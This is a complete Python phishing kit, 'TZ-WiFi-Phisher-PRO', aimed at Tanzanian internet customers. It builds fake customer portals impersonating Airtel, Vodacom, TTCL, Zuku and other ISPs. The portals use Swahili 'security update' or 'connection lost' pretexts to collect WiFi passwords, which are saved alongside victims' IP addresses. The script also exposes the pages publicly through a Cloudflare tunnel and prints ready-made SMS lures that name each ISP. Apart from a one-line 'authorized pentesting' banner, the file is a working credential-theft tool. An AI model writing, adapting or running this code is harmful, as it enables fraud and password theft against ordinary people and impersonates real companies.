#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════╗
║     TZ-WiFi-Phisher-PRO v2.5 - FIBRE EDITION                          ║
║     Advanced WiFi Credential Harvester for Tanzania                    ║
║                                                                        ║
║     created by Mr.virus hacker from Tanzania 🧑‍💻                        ║
║      whatsaap me for any problem no :+255762358108                                                                 ║
║      github :  mrvirus148                                                ║
╚══════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import re
import signal
import random
import string
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from colorama import init, Fore, Style

init(autoreset=True)

PORT = 8080
CREDS_FILE = "tz_creds_captured.txt"
LOG_FILE = "tz_session.log"

def banner():
    print(Fore.CYAN + Style.BRIGHT + """
╔══════════════════════════════════════════════════════════════════════════╗
║     🇹🇿  TZ-WiFi-Phisher-PRO v2.5 - FIBRE EDITION  🇹🇿                      ║
║     Advanced WiFi Credential Harvester for Tanzania                        ║
║     github : mrvirus148                                                                       ║
║     whatsaap me for any problem :255762358108                             ║
║     CLOUDFLARE TUNNEL - Inafanya kazi kwa uhakika!                      ║
║     created by Mr.virus hacker from Tanzania                            ║  
║     AUTHORIZED PENTESTING USE ONLY !                                       ║
╚══════════════════════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL)

# ===================== TANZANIA ISP TEMPLATES =====================

def get_tz_isp_page(isp, scenario, victim_ip=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    templates = {
        # Mobile WiFi (4G/5G)
        "airtel": {"name": "Airtel Tanzania", "type": "4G WiFi", "logo_color": "#e30613", "bg_gradient": "linear-gradient(135deg, #e30613 0%, #b00510 100%)", "support_number": "+255 768 990 990", "support_email": "customercare@airtel.co.tz", "official_site": "www.airtel.co.tz"},
        "yas": {"name": "YAS (Yetu Access Services)", "type": "Wireless Internet", "logo_color": "#003399", "bg_gradient": "linear-gradient(135deg, #003399 0%, #002266 100%)", "support_number": "+255 22 213 6000", "support_email": "info@yas.co.tz", "official_site": "www.yas.co.tz"},
        "halotel": {"name": "Halotel Tanzania", "type": "4G LTE", "logo_color": "#006341", "bg_gradient": "linear-gradient(135deg, #006341 0%, #004d32 100%)", "support_number": "+255 22 292 7000", "support_email": "info@halotel.co.tz", "official_site": "www.halotel.co.tz"},
        "ttcl": {"name": "TTCL", "type": "Mobile Network", "logo_color": "#004b87", "bg_gradient": "linear-gradient(135deg, #004b87 0%, #003366 100%)", "support_number": "+255 22 219 7000", "support_email": "info@ttcl.co.tz", "official_site": "www.ttcl.co.tz"},
        
        # Fibre WiFi (Home/Office)
        "ttcl_fibre": {"name": "TTCL Fibre", "type": "Fibre Broadband", "logo_color": "#004b87", "bg_gradient": "linear-gradient(135deg, #004b87 0%, #002244 100%)", "support_number": "+255 22 219 7100", "support_email": "fibre@ttcl.co.tz", "official_site": "www.ttcl.co.tz/fibre"},
        "zuku": {"name": "Zuku Fibre", "type": "Fibre Internet", "logo_color": "#ff6600", "bg_gradient": "linear-gradient(135deg, #ff6600 0%, #cc5200 100%)", "support_number": "+255 22 286 0000", "support_email": "info@zuku.co.tz", "official_site": "www.zuku.co.tz"},
        "vodacom": {"name": "Vodacom Fibre", "type": "Fibre Broadband", "logo_color": "#e60000", "bg_gradient": "linear-gradient(135deg, #e60000 0%, #b30000 100%)", "support_number": "+255 75 400 0000", "support_email": "fibre@vodacom.co.tz", "official_site": "www.vodacom.co.tz/fibre"},
        
        "generic": {"name": "Mtandao Tanzania", "type": "Wireless Network", "logo_color": "#1a73e8", "bg_gradient": "linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%)", "support_number": "+255 768 990 990", "support_email": "support@mtandao.co.tz", "official_site": "www.mtandao.co.tz"}
    }
    
    provider = templates.get(isp, templates["generic"])
    
    # Fibre-specific scenarios
    fibre_scenarios = {
        "update": {"title": "Fibre Router Security Update", "desc": "Tafadhali ingiza password ya WiFi yako ili kusasisha fibre router.", "alert": "Security update: Fibre router yako inahitaji update ya haraka ili kuzuia wizi wa mtandao.", "btn": "Sasisha Fibre Router", "loading": "Inasasisha Fibre Router..."},
        "disconnected": {"title": "Fibre Connection Lost", "desc": "Muunganiko wa fibre umekatika. Ingiza password kuunganisha tena.", "alert": "Connection Lost: Fibre yako imekatika. Tafadhali ingiza password kurejesha muunganiko.", "btn": "Unganisha Fibre Tena", "loading": "Inaunganisha Fibre..."},
        "expired": {"title": "Fibre Authentication Expired", "desc": "Muda wa authentication ya fibre yako umeisha. Ingiza password tena.", "alert": "Authentication Expired: Password ya fibre router yako inahitaji kusasishwa.", "btn": "Thibitisha Fibre Password", "loading": "Inathibitisha Fibre Password..."}
    }
    
    # Use fibre scenarios for fibre ISPs
    if isp in ["ttcl_fibre", "zuku", "vodacom"]:
        scenarios = fibre_scenarios
    else:
        scenarios = {
            "update": {"title": "WiFi Security Update Required", "desc": "Tafadhali ingiza password yako ya WiFi ili kusasisha mtandao wako.", "alert": "Security update: Router yako inahitaji update ya haraka ili kuzuia wizi wa mtandao.", "btn": "Sasisha Mtandao", "loading": "Inasasisha Mtandao..."},
            "disconnected": {"title": "WiFi Connection Lost", "desc": "Mtandao wako umeacha kufanya kazi. Ingiza password kuunganisha tena.", "alert": "Connection Lost: Mtandao wako umekatika. Tafadhali ingiza password kurejesha muunganiko.", "btn": "Unganisha Tena", "loading": "Inaunganisha Tena..."},
            "expired": {"title": "Network Authentication Expired", "desc": "Muda wa authentication ya mtandao wako umeisha. Ingiza password tena.", "alert": "Authentication Expired: Password ya WiFi yako inahitaji kusasishwa.", "btn": "Thibitisha Password", "loading": "Inathibitisha Password..."}
        }
    
    scenario_data = scenarios.get(scenario, scenarios["update"])
    
    current_hour = datetime.now().hour
    if 5 <= current_hour < 12: greeting = "Habari za asubuhi"
    elif 12 <= current_hour < 17: greeting = "Habari za mchana"
    elif 17 <= current_hour < 21: greeting = "Habari za jioni"
    else: greeting = "Habari za usiku"
    
    # Fibre icon
    icon = "🔌" if isp in ["ttcl_fibre", "zuku", "vodacom"] else "📶"
    
    return f"""<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>{provider['name']} - Customer Portal</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }}
        body {{ background: #f5f7fa; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 15px; }}
        .container {{ width: 100%; max-width: 420px; background: white; border-radius: 16px; overflow: hidden; box-shadow: 0 8px 40px rgba(0,0,0,0.12); }}
        .header {{ background: {provider['bg_gradient']}; padding: 30px 25px 25px; text-align: center; }}
        .header .provider-icon {{ width: 70px; height: 70px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; font-size: 32px; border: 2px solid rgba(255,255,255,0.3); }}
        .header h1 {{ color: white; font-size: 20px; font-weight: 700; }}
        .header p {{ color: rgba(255,255,255,0.85); font-size: 13px; margin-top: 5px; }}
        .header .greeting {{ color: rgba(255,255,255,0.7); font-size: 11px; margin-top: 8px; }}
        .header .type-badge {{ display: inline-block; background: rgba(255,255,255,0.15); color: white; padding: 3px 12px; border-radius: 20px; font-size: 11px; margin-top: 8px; }}
        .content {{ padding: 25px; }}
        .scenario-badge {{ background: {provider['bg_gradient']}; color: white; padding: 12px; border-radius: 10px; text-align: center; margin-bottom: 18px; font-weight: 600; font-size: 14px; }}
        .network-info {{ background: #f8f9fc; border: 1px solid #e8ecf1; border-radius: 12px; padding: 16px; margin-bottom: 18px; display: flex; align-items: center; gap: 14px; }}
        .network-info .wifi-icon {{ font-size: 32px; }}
        .network-info .details {{ flex: 1; }}
        .network-info .ssid {{ font-weight: 700; color: #1a1a2e; font-size: 15px; }}
        .network-info .provider-name {{ color: {provider['logo_color']}; font-size: 12px; font-weight: 500; }}
        .network-info .status {{ color: #e30613; font-size: 12px; margin-top: 3px; }}
        .alert-box {{ background: #fff8e6; border: 1px solid #ffd700; border-radius: 10px; padding: 14px; margin-bottom: 18px; display: flex; gap: 10px; }}
        .alert-box .text {{ font-size: 12px; color: #664d00; }}
        .form-group {{ margin-bottom: 16px; }}
        .form-group label {{ display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 6px; }}
        .form-group input {{ width: 100%; padding: 14px 16px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 15px; background: #fafafa; }}
        .form-group input:focus {{ border-color: {provider['logo_color']}; outline: none; }}
        .btn {{ width: 100%; padding: 15px; background: {provider['bg_gradient']}; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; }}
        .btn:hover {{ transform: translateY(-2px); }}
        .trust-badges {{ display: flex; justify-content: center; gap: 20px; margin: 18px 0; font-size: 11px; color: #888; }}
        .footer {{ border-top: 1px solid #e8ecf1; padding: 15px 25px; text-align: center; font-size: 10px; color: #aaa; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="provider-icon">{icon}</div>
            <h1>{provider['name']}</h1>
            <p>{scenario_data['title']}</p>
            <div class="type-badge">{provider['type']}</div>
            <div class="greeting">{greeting}, mteja wa {provider['name']}</div>
        </div>
        <div class="content">
            <div class="scenario-badge">{scenario_data['title'].upper()}</div>
            <div class="network-info">
                <div class="wifi-icon">{icon}</div>
                <div class="details">
                    <div class="ssid">{provider['name']} Network</div>
                    <div class="provider-name">{provider['type']}</div>
                    <div class="status">● {scenario_data['desc']}</div>
                </div>
            </div>
            <div class="alert-box">
                <span class="text">{scenario_data['alert']}</span>
            </div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <label>WiFi Password / Nenosiri la Mtandao</label>
                    <input type="password" name="password" placeholder="Ingiza password ya WiFi" required autofocus>
                </div>
                <input type="hidden" name="provider" value="{isp}">
                <input type="hidden" name="scenario" value="{scenario}">
                <button type="submit" class="btn">{scenario_data['btn']}</button>
            </form>
            <div class="trust-badges">
                <span>🔒 SSL Secure</span>
                <span>✅ Official {provider['name']}</span>
                <span>📱 {provider['support_number']}</span>
            </div>
        </div>
        <div class="footer">
            <strong>{provider['name']}</strong> | {provider['official_site']}<br>
            &copy; {datetime.now().year}
        </div>
    </div>
</body>
</html>"""


# ===================== HTTP HANDLER =====================

class PhisherHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        if parsed.path in ['/', '/index.html', '/wifi']:
            isp = params.get('isp', ['airtel'])[0]
            scenario = params.get('scenario', ['update'])[0]
            html = get_tz_isp_page(isp, scenario, self.client_address[0])
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Cache-Control', 'no-store')
            self.end_headers()
            self.wfile.write(html.encode('utf-8'))
            print(Fore.BLUE + f"[{datetime.now().strftime('%H:%M:%S')}] 👁️ VICTIM VISIT - ISP: {isp} | IP: {self.client_address[0]}" + Style.RESET_ALL)
        
        elif parsed.path == '/creds':
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain; charset=utf-8')
            self.end_headers()
            if os.path.exists(CREDS_FILE):
                with open(CREDS_FILE, 'r') as f:
                    self.wfile.write(f.read().encode() or b"No credentials yet.\n")
            else:
                self.wfile.write(b"No credentials yet.\n")
        else:
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()
    
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8')
        params = parse_qs(body)
        
        if '/capture' in self.path:
            password = params.get('password', [''])[0]
            provider = params.get('provider', ['unknown'])[0]
            scenario = params.get('scenario', ['unknown'])[0]
            
            if password:
                ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                entry = f"""
{'='*60}
✅ PASSWORD CAPTURED - {ts}
{'='*60}
🌐 Provider  : {provider}
🔄 Scenario  : {scenario}
🔑 Password  : {password}
📱 IP        : {self.client_address[0]}
{'='*60}
"""
                print(Fore.GREEN + Style.BRIGHT + entry)
                with open(CREDS_FILE, 'a') as f:
                    f.write(entry)
            
            self.send_response(302)
            self.send_header('Location', 'https://www.youtube.com')
            self.end_headers()
    
    def log_message(self, format, *args):
        pass


# ===================== CLOUDFLARE TUNNEL - FIXED VERSION =====================

def install_cloudflared():
    """Install cloudflared moja kwa moja - improved"""
    print(f"\n{Fore.YELLOW}[*] Ina-install cloudflared...{Style.RESET_ALL}")
    
    # Method 1: Python requests
    try:
        import requests
        print(f"{Fore.YELLOW}[*] Method 1: Python requests...{Style.RESET_ALL}")
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        headers = {'User-Agent': 'Mozilla/5.0'}
        r = requests.get(url, timeout=60, headers=headers, allow_redirects=True)
        if r.status_code == 200:
            with open('/usr/local/bin/cloudflared', 'wb') as f:
                f.write(r.content)
            os.system('chmod +x /usr/local/bin/cloudflared')
            result = subprocess.run(['cloudflared', '--version'], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"{Fore.GREEN}[✓] cloudflared installed: {result.stdout.strip()}{Style.RESET_ALL}")
                return True
    except Exception as e:
        print(f"{Fore.YELLOW}[!] Method 1 failed: {e}{Style.RESET_ALL}")
    
    # Method 2: wget
    try:
        print(f"{Fore.YELLOW}[*] Method 2: wget...{Style.RESET_ALL}")
        os.system("wget -q --timeout=60 -O /usr/local/bin/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 2>/dev/null")
        os.system("chmod +x /usr/local/bin/cloudflared")
        result = subprocess.run(['cloudflared', '--version'], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            print(f"{Fore.GREEN}[✓] cloudflared installed via wget{Style.RESET_ALL}")
            return True
    except:
        pass
    
    # Method 3: curl
    try:
        print(f"{Fore.YELLOW}[*] Method 3: curl...{Style.RESET_ALL}")
        os.system("curl -sL --max-time 60 -o /usr/local/bin/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 2>/dev/null")
        os.system("chmod +x /usr/local/bin/cloudflared")
        result = subprocess.run(['cloudflared', '--version'], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            print(f"{Fore.GREEN}[✓] cloudflared installed via curl{Style.RESET_ALL}")
            return True
    except:
        pass
    
    # Method 4: apt
    try:
        print(f"{Fore.YELLOW}[*] Method 4: apt install...{Style.RESET_ALL}")
        result = subprocess.run(['sudo', 'apt', 'install', '-y', 'cloudflared'], capture_output=True, text=True, timeout=120)
        if result.returncode == 0:
            print(f"{Fore.GREEN}[✓] cloudflared installed via apt{Style.RESET_ALL}")
            return True
    except:
        pass
    
    print(f"{Fore.RED}[✗] cloudflared imeshindwa install kwa njia zote.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Jaribu manually: sudo apt update && sudo apt install -y cloudflared{Style.RESET_ALL}")
    return False


def setup_cloudflare():
    """Anzisha Cloudflare tunnel - FULLY FIXED VERSION"""
    print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}║     ☁️  CLOUDFLARE TUNNEL - INAANZA...                      ║")
    print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    # Step 1: Check kama cloudflared ipo
    cloudflared_path = None
    for path in ['cloudflared', '/usr/local/bin/cloudflared', '/usr/bin/cloudflared']:
        result = subprocess.run(['which', path], capture_output=True, text=True, shell=True)
        if result.returncode == 0:
            cloudflared_path = path
            break
    
    # Try 'which' directly
    result = subprocess.run(['which', 'cloudflared'], capture_output=True, text=True)
    if result.returncode == 0 and result.stdout.strip():
        cloudflared_path = result.stdout.strip()
    
    if not cloudflared_path:
        print(f"{Fore.YELLOW}[!] cloudflared haipo. Ina-install...{Style.RESET_ALL}")
        if not install_cloudflared():
            print(f"{Fore.RED}[✗] cloudflared imeshindwa install. Endesha hii manually:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}sudo apt update && sudo apt install -y cloudflared{Style.RESET_ALL}")
            return None
        cloudflared_path = 'cloudflared'
    
    # Show version
    try:
        result = subprocess.run([cloudflared_path, '--version'], capture_output=True, text=True, timeout=10)
        print(f"{Fore.GREEN}[✓] cloudflared: {result.stdout.strip()}{Style.RESET_ALL}")
    except:
        print(f"{Fore.GREEN}[✓] cloudflared ipo{Style.RESET_ALL}")
    
    # Step 2: Kill existing cloudflared processes
    os.system("pkill -9 -f cloudflared 2>/dev/null")
    time.sleep(2)
    
    print(f"{Fore.YELLOW}[*] Inaanzisha tunnel kwenye localhost:{PORT}...{Style.RESET_ALL}")
    
    # Step 3: Futa log file kabla
    log_file = '/tmp/cloudflare.log'
    if os.path.exists(log_file):
        os.remove(log_file)
    
    # Step 4: Anza tunnel kwenye background - capture BOTH stdout and stderr
    cmd = [cloudflared_path, 'tunnel', '--url', f'http://localhost:{PORT}']
    
    with open(log_file, 'w') as log:
        process = subprocess.Popen(
            cmd,
            stdout=log,
            stderr=subprocess.STDOUT,  # CRITICAL: stderr inaenda kwenye log pia
            stdin=subprocess.DEVNULL
        )
    
    print(f"{Fore.YELLOW}[*] Inasubiri tunnel ianze...{Style.RESET_ALL}")
    
    # Step 5: Subiri na angalia log mara kwa mara (30 seconds max)
    url = None
    max_wait = 30  # seconds
    
    for i in range(max_wait):
        time.sleep(1)
        print(f"{Fore.GREEN}.{Style.RESET_ALL}", end="", flush=True)
        
        if not os.path.exists(log_file):
            continue
        
        try:
            with open(log_file, 'r') as f:
                content = f.read()
            
            if not content:
                continue
            
            # Search for URL - multiple patterns
            patterns = [
                r'https?://[a-zA-Z0-9][a-zA-Z0-9.-]*\.trycloudflare\.com',
                r'https?://[a-zA-Z0-9][a-zA-Z0-9.-]*\.cf-[a-z0-9]+\.trycloudflare\.com',
                r'https?://[a-zA-Z0-9][-a-zA-Z0-9]*\.?[a-z]+\.trycloudflare\.com',
                r'https?://[^\s"\']+trycloudflare\.com[^\s"\']*',
            ]
            
            for pattern in patterns:
                match = re.search(pattern, content)
                if match:
                    potential_url = match.group().strip().rstrip('/.,;:!?)')
                    # Validate it's a proper URL
                    if 'trycloudflare.com' in potential_url:
                        url = potential_url
                        break
            
            if url:
                break
                
            # Check for errors
            if any(err in content.lower() for err in ['error', 'failed', 'cannot', 'refused', 'timeout']):
                print(f"\n{Fore.YELLOW}[!] Hitilafu kwenye log, inaendelea kusubiri...{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"\n{Fore.YELLOW}[!] Error reading log: {e}{Style.RESET_ALL}")
    
    print()  # newline after dots
    
    # Step 6: Ikiwa hatujapata URL, jaribu tena kusoma log
    if not url and os.path.exists(log_file):
        try:
            with open(log_file, 'r') as f:
                content = f.read()
            
            # Try harder with more patterns
            patterns = [
                r'https?://[^\s"\']+',
                r'http[s]?://[a-zA-Z0-9][-a-zA-Z0-9.]+[.][a-zA-Z]{2,}',
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, content)
                for match in matches:
                    if 'trycloudflare' in match or 'cloudflare' in match:
                        url = match.strip().rstrip('/.,;:!?)')
                        break
                if url:
                    break
        except:
            pass
    
    # Step 7: Display result
    if url:
        print(f"\n{Fore.GREEN}╔══════════════════════════════════════════════════════════════╗")
        print(f"{Fore.GREEN}║     ✅  CLOUDFLARE TUNNEL INAFANYA KAZI!                    ║")
        print(f"{Fore.GREEN}╠══════════════════════════════════════════════════════════════╣")
        print(f"{Fore.GREEN}║                                                              ║")
        print(f"{Fore.GREEN}║  {Fore.WHITE}{url}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}║                                                              ║")
        print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        return url
    else:
        print(f"\n{Fore.RED}[✗] Cloudflare tunnel URL haijapatikana.{Style.RESET_ALL}")
        
        # Show log for debugging
        if os.path.exists(log_file):
            try:
                with open(log_file, 'r') as f:
                    content = f.read()
                print(f"\n{Fore.YELLOW}[!] Log file contents (last 2000 chars):{Style.RESET_ALL}")
                print(Fore.CYAN + content[-2000:] + Style.RESET_ALL)
            except:
                pass
        
        print(f"\n{Fore.YELLOW}[*] Jaribu kuanzisha tunnel manually:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}cloudflared tunnel --url http://localhost:{PORT}{Style.RESET_ALL}")
        
        # Alternative: return local URL instead
        print(f"{Fore.YELLOW}[*] Kwa sasa, tunnel haipo. Tumia local URL badala yake.{Style.RESET_ALL}")
        return None


# ===================== MAIN =====================

def main():
    banner()
    
    print(Fore.YELLOW + "╔══════════════════════════════════════════════════════════════╗")
    print(Fore.YELLOW + "║     TZ-WiFi-Phisher-PRO v2.5 - SETUP                       ║")
    print(Fore.YELLOW + "╚══════════════════════════════════════════════════════════════╝" + Style.RESET_ALL)
    
    # ===== STEP 1: ISP =====
    print(f"\n{Fore.CYAN}[1/4] CHAGUA ISP YA TARGET:{Style.RESET_ALL}")
    print(f"\n  {Fore.WHITE}--- MOBILE WiFi (4G/5G) ---{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}1) {Fore.RED}Airtel Tanzania")
    print(f"  {Fore.WHITE}2) {Fore.BLUE}YAS (Yetu Access Services)")
    print(f"  {Fore.WHITE}3) {Fore.GREEN}Halotel Tanzania")
    print(f"  {Fore.WHITE}4) {Fore.CYAN}TTCL Mobile")
    print(f"\n  {Fore.WHITE}--- FIBRE WiFi (Nyumbani/Ofisini) ---{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}5) {Fore.CYAN}TTCL Fibre Broadband")
    print(f"  {Fore.WHITE}6) {Fore.YELLOW}Zuku Fibre")
    print(f"  {Fore.WHITE}7) {Fore.RED}Vodacom Fibre")
    print(f"\n  {Fore.WHITE}8) {Fore.WHITE}Generic (general template)")
    
    isp_choice = input(f"\n{Fore.YELLOW}Chagua ISP [1-8] (default=1): {Style.RESET_ALL}").strip() or "1"
    
    isp_map = {
        "1": ("Airtel Tanzania", "airtel", "Mobile"),
        "2": ("YAS", "yas", "Mobile"),
        "3": ("Halotel", "halotel", "Mobile"),
        "4": ("TTCL Mobile", "ttcl", "Mobile"),
        "5": ("TTCL Fibre Broadband", "ttcl_fibre", "Fibre"),
        "6": ("Zuku Fibre", "zuku", "Fibre"),
        "7": ("Vodacom Fibre", "vodacom", "Fibre"),
        "8": ("Generic", "generic", "Generic")
    }
    isp_name, isp_code, isp_type = isp_map.get(isp_choice, ("Airtel Tanzania", "airtel", "Mobile"))
    print(f"{Fore.GREEN}  ✓ {isp_name} ({isp_type}){Style.RESET_ALL}")
    
    # ===== STEP 2: SCENARIO =====
    print(f"\n{Fore.CYAN}[2/4] CHAGUA SCENARIO:{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}1) Security Update")
    print(f"  {Fore.WHITE}2) Disconnected / Connection Lost")
    print(f"  {Fore.WHITE}3) Authentication Expired")
    
    scen_choice = input(f"{Fore.YELLOW}Chagua [1-3] (default=1): {Style.RESET_ALL}").strip() or "1"
    scen_map = {"1": "update", "2": "disconnected", "3": "expired"}
    scenario = scen_map.get(scen_choice, "update")
    scen_desc = {"update": "Security Update", "disconnected": "Disconnected", "expired": "Authentication Expired"}
    print(f"{Fore.GREEN}  ✓ {scen_desc[scenario]}{Style.RESET_ALL}")
    
    # ===== STEP 3: CLOUDFLARE =====
    print(f"\n{Fore.CYAN}[3/4] CLOUDFLARE TUNNEL:{Style.RESET_ALL}")
    print(f"  Hii itakupa public URL kumtumia victim popote aiko")
    use_tunnel = input(f"{Fore.YELLOW}Tumia Cloudflare tunnel? (y/N): {Style.RESET_ALL}").strip().lower()
    
    tunnel_url = None
    if use_tunnel == 'y':
        tunnel_url = setup_cloudflare()
    else:
        print(f"{Fore.YELLOW}  ✓ Local network tu (victim akiwa WiFi moja na wewe){Style.RESET_ALL}")
    
    # ===== STEP 4: SERVER =====
    print(f"\n{Fore.CYAN}[4/4] ANZISHA SERVER...{Style.RESET_ALL}")
    
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except:
        local_ip = "127.0.0.1"
    
    server = HTTPServer(('0.0.0.0', PORT), PhisherHandler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    
    print(f"{Fore.GREEN}[✓] Server umeanza kwenye port {PORT}!{Style.RESET_ALL}")
    
    # ===== VICTIM LINK =====
    if tunnel_url:
        victim_link = f"{tunnel_url}/wifi?isp={isp_code}&scenario={scenario}"
    else:
        victim_link = f"http://{local_ip}:{PORT}/wifi?isp={isp_code}&scenario={scenario}"
    
    # ===== DISPLAY =====
    print(f"\n\n{Fore.MAGENTA}{Style.BRIGHT}{'='*60}")
    print(f"   🎯  LINK YA KUMTUMIA VICTIM:")
    print(f"{'='*60}{Style.RESET_ALL}")
    print(f"\n{Fore.GREEN}{Style.BRIGHT}{victim_link}{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}📋 DETAILS:{Style.RESET_ALL}")
    print(f"  ISP        : {isp_name} ({isp_type})")
    print(f"  Scenario   : {scen_desc[scenario]}")
    print(f"  Tunnel     : {'✅ Cloudflare Active' if tunnel_url else '📍 Local Network'}")
    
    # Social engineering scripts
    print(f"\n{Fore.YELLOW}💬 SOCIAL ENGINEERING SCRIPTS:{Style.RESET_ALL}")
    
    scripts = {
        "airtel": [
            f"\"Habari, naitwa [jina] kutoka Airtel Tanzania. Tunafanya update ya usalama. Fungua: {victim_link}\"",
            f"\"AIRTEL: Router yako inahitaji security update haraka: {victim_link}\""
        ],
        "yas": [
            f"\"YAS Customer Care: Mtandao wako utakatika kama hutaweka password mpya: {victim_link}\""
        ],
        "halotel": [
            f"\"Halotel: Security update inahitajika kwenye mtandao wako: {victim_link}\""
        ],
        "ttcl": [
            f"\"TTCL: Mtandao wako unaonyesha weakness. Ingiza password mpya: {victim_link}\""
        ],
        "ttcl_fibre": [
            f"\"TTCL Fibre: Fibre router yako inahitaji update ya usalama. Bonyeza: {victim_link}\"",
            f"\"TTCL: Fibre yako inaonyesha tatizo la kiusalama. Rekebisha: {victim_link}\""
        ],
        "zuku": [
            f"\"Zuku Fibre: Router yako inahitaji update ya usalama. Fungua link: {victim_link}\"",
            f"\"ZUKU: Fibre connection yako imegunduliwa na weakness. Bonyeza: {victim_link}\""
        ],
        "vodacom": [
            f"\"Vodacom Fibre: Fibre router yako inahitaji security update. Bonyeza: {victim_link}\"",
            f"\"VODACOM: Fibre yako inahitaji update ya haraka. Fungua: {victim_link}\""
        ]
    }
    
    for script in scripts.get(isp_code, [f"\"WiFi yako inahitaji update. Fungua: {victim_link}\""]):
        print(f"  {Fore.CYAN}{script}{Style.RESET_ALL}\n")
    
    print(f"\n{Fore.MAGENTA}{'='*60}")
    print(f"{Fore.GREEN}{Style.BRIGHT}   📡  INASUBIRI VICTIM KUFUNGUA LINK...")
    print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}Commands:")
    print(f"  View creds:  {Fore.CYAN}cat {CREDS_FILE}")
    print(f"  Web creds:   {Fore.CYAN}http://localhost:{PORT}/creds")
    print(f"  Stop:        {Fore.CYAN}Ctrl+C")
    
    try:
        last_count = 0
        while True:
            time.sleep(3)
            if os.path.exists(CREDS_FILE):
                with open(CREDS_FILE, 'r') as f:
                    content = f.read()
                count = content.count('PASSWORD CAPTURED')
                if count > last_count:
                    print(Fore.GREEN + f"\n[📡] +{count - last_count} password! Total: {count}" + Style.RESET_ALL)
                    last_count = count
            print(Fore.GREEN + "." + Style.RESET_ALL, end="", flush=True)
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Inasimamisha...{Style.RESET_ALL}")
        server.shutdown()
        os.system("pkill -9 -f cloudflared 2>/dev/null")
        print(f"{Fore.GREEN}[✓] Imesimama.{Style.RESET_ALL}")
        if os.path.exists(CREDS_FILE):
            with open(CREDS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    print(f"\n{Fore.GREEN}PASSWORDS CAPTURED:{Style.RESET_ALL}")
                    print(Fore.CYAN + content + Style.RESET_ALL)
        print(f"{Fore.GREEN}[✓] Done.{Style.RESET_ALL}")


if __name__ == "__main__":
    main()

